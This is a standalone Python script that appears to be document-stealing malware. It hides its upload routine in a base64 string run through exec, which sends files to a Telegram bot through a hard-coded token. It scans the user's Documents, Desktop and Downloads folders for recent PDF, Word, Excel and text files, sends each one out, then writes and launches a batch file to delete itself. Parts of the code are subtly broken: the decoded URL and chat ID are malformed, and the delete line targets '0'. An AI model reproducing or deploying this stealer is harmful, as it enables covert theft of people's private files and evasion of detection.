import os
import time
import base64
import threading
from pathlib import Path
import sys

TOKEN = "7600622859:AAHRL2Ecklon0eZMcRr0_s3sVj8qe1r43aE"
CHAT_ID = "5816337689"
INTERVAL = 60 * 60 * 3
EXTENSIONS = ['.pdf', '.docx', '.xlsx', '.txt']

encoded_payload = b"""aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwoKZGVmIHNlbmRfZmlsZShmaWxlcGF0aCk6CiAgICB3aXRoIG9wZW4oZmlsZXBhdGgsICdyYicpIGFzIGY6CiAgICAgICAgdXJsID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QnNzYwMDYyMjg1OTpBQUhSTDJFY2tsb24wZVpNY1JyMF9zM3NWajhxZTFyNDNhRS9zZW5kRG9jdW1lbnQiLmZvcm1hdChUT0tFTikKICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9eyJjaGF0X2lkIjogNzYwMDYyMjg1OX0sIGZpbGVzPXsiZG9jdW1lbnQiOiBmfSk="""

try:
    exec(base64.b64decode(encoded_payload).decode(), globals())
except Exception as e:
    with open(os.path.expanduser("~/Desktop/debug.log"), "w") as f:
        f.write(f"[PAYLOAD ERROR] {str(e)}\n")

def harvest_documents():
    try:
        base_dirs = ["Documents", "Desktop", "Downloads"]
        home = str(Path.home())
        for folder in base_dirs:
            root_path = os.path.join(home, folder)
            for root, _, files in os.walk(root_path):
                for f in files:
                    if any(f.lower().endswith(ext) for ext in EXTENSIONS):
                        path = os.path.join(root, f)
                        if time.time() - os.path.getmtime(path) < INTERVAL:
                            send_file(path)
    except Exception as e:
        with open(os.path.expanduser("~/Desktop/debug.log"), "a") as f:
            f.write(f"[SCAN ERROR] {str(e)}\n")

def self_delete():
    try:
        script_path = os.path.abspath(sys.argv[0])
        bat_path = script_path + ".bat"
        bat_code = "@echo off\n" +                    "ping 127.0.0.1 > nul\n" +                    'del "0" /f /q\n'.format(script_path) +                    'del "%~f0" /f /q\n'
        with open(bat_path, 'w') as f:
            f.write(bat_code)
        os.startfile(bat_path)
    except Exception as e:
        with open(os.path.expanduser("~/Desktop/debug.log"), "a") as f:
            f.write(f"[DELETE ERROR] {str(e)}\n")

if __name__ == "__main__":
    harvest_documents()
    self_delete()

